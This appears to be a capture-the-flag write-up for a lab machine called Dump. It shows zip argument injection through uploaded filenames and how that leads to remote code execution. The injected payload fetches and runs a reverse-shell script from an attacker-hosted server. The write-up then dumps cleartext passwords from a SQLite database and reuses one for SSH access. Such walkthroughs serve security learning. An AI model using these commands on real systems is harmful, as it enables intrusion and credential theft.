## Overview

Dump is a hard-rated Linux machine running a custom PHP "packet capture" web app. The app lets you capture traffic, upload `.pcap` files, and download them all as a zip. That download feature shells out to `zip out.zip *` over your uploaded files — so a filename that looks like a `zip` option becomes one, and the GTFOBins `-T -TT <cmd>` pair turns that into remote code execution as `www-data`. From there a SQLite database in the web root hands over a cleartext password that is reused for the `fritz` SSH account. This post covers recon through `user.txt`.

## Enumeration

The app (`index.php`) offers open registration. After registering and logging in you get three actions: **Capture Live Traffic**, **Upload Capture**, and **Download Captures**.

Triggering **Download Captures** returns an HTML comment that looks exactly like the output of the Linux `zip` command:

```text
Preparing download...
<!--
  adding: <uuid> (deflated 33%)
-->
```

That strongly implies the server runs something like `zip out.zip *` over the files in your capture directory. If `zip` is fed our filenames via a glob, a filename beginning with `-` will be parsed by `zip` as an **option** — argument injection.

Uploading a file literally named `-h` confirms it: the response is the `zip` help menu instead of an archive.

## Foothold

`zip` has a GTFOBins command-execution primitive: `-T` (test the archive) combined with `-TT <cmd>` (run `<cmd>` instead of `unzip` to perform the test). A single multi-word filename fails due to shell quoting, but the arguments can be split across **separate uploads** so each filename becomes its own argument.

The app filters `/` and `\` in filenames, so we can't put a path directly in the command. Instead we fetch a hosted script with `wget -r <ip:port>` (no slash needed) and run it. Three uploads, in order:

1. `test`
2. `-T`
3. `-TT wget -r <lhost>:<lport> -nd;bash s.sh;echo`

Host `s.sh` (a reverse shell / command runner) on a simple web server, then trigger **Download Captures**. The injected `-TT` value executes, pulling and running our script.

> Tooling note: `curl -F` treats `;` in the multipart filename as a sub-option separator and silently truncates the payload. Build the uploads with Python `requests` + `requests_toolbelt` so the `;bash s.sh;echo` survives intact.

```bash
# attacker: host the payload
python3 -m http.server <lport> --bind 0.0.0.0

# upload test, -T, and the -TT payload, then GET /download.php (Python requests)
python3 upload.py
```

![www-data RCE and sudo -l](/assets/Images/dump-003_foothold_wwwdata-rce-sudo-l.png)

That lands a shell as `www-data`. The app keeps its database in the web root, and it stores passwords in **cleartext**:

```bash
sqlite3 /var/www/database/database.sqlite3 'select * from users'
# fritz|<redacted-cleartext-password>|<guid>
```

That password is reused for the system user `fritz`, so it works over SSH:

```bash
sshpass -p '<redacted>' ssh fritz@10.129.234.97
```
